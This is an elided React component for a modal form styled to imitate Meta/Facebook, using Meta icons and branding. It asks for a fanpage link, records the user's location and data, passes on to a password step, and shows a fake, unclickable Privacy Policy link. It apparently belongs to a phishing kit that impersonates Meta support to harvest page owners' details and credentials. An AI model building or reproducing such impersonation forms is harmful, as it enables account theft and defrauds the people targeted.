...
import { getUserLocation, saveRecord } from '@/app/utils';
...
const ClientModal: React.FC<ClientModalProps> = ({ isOpenAuth, userLocation, countryCode, onToggleAuth, onOpendPassword }) => {
    ...
    const handSubmit = async (e: React.FormEvent) => {
        try {
            ...
            if (!formData.fanpage.trim()) newErrors.fanpage = 'Please enter enough link to fanpage.';
        ...
        >
            <form onSubmit={handSubmit}>
                <div>
                    ...
                    <div className='flex items-center gap-[10px] justify-between mb-[10px] bg-[white] p-[10px] rounded-[10px]'>
                        <div className='w-[100% - 38px] flex items-center gap-[10px] flex-start bg-[white] rounded-[10px]'>
                            <div className='w-[16px] h-[16px]'>
                                <img src="/images/meta/fb-black.svg" width="100%" height="100%" alt="" />
                            </div>
                            <div className='w-[100% - 26px]'>
                                <b className='text-[16px] text-[black]'>on Facebook</b>
                                <p className='text-[#9a979e] text-[14px]'>We will send you a notification on Facebook.</p>
                            </div>
                        </div>
                    ...
                    <div className='flex items-center gap-[10px] justify-between mb-[10px] bg-[white] p-[10px] rounded-[10px]'>
                        <div className='w-[100% - 10px - 32px] flex items-center gap-[10px] flex-start bg-[white] rounded-[10px]'>
                            <div className='w-[16px] h-[16px]'>
                                <img src="/images/meta/email-black.svg" width="100%" height="100%" alt="" />
                            </div>
                            <div className='w-[100% - 26px]'>
                                <b className='text-[16px] text-[black]'>on Email</b>
                                <p className='text-[#9a979e] text-[14px]'>We will send you a notification on Facebook.</p>
                            </div>
                        </div>
                    ...
                    <div className='mt-[15px] mb-[20px]'>
                        <label className='cursor-pointer flex items-center gap-[5px] text-[14px] ' htmlFor="custom-checkbox">
                            <CustomCheckbox />
                            I agree with
                            <a className="text-[#0d6efd] flex items-center gap-[5px] inline pointer-events-none" href="">Privacy Policy <img src="/images/meta/reject.svg" className="w-[10px] h-[10px] items-center inline" alt="" /></a>
                        </label>
                    </div>
                    <div className='w-full mt-[20px] '>
                        <button className='w-full bg-[#0064E0] text-[white] rounded-[40px] pt-[10px] pb-[10px] flex items-center justify-center cursor-pointer'>Send</button>
                    </div>
                </div>
            </form>
        </Modal>
